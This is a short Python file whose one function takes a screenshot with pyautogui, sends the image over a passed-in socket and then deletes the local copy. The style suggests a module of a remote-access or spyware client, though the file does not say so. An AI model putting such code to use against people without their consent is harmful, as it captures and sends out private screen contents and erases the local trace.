import pyautogui
import os

def capture_screenshot(my_socket):
    print("[+] Taking Screenshot")

    screenshot = pyautogui.screenshot()

    name = "screenshot.png"
    screenshot.save(name)

    my_socket.send_file(name)

    os.remove(name)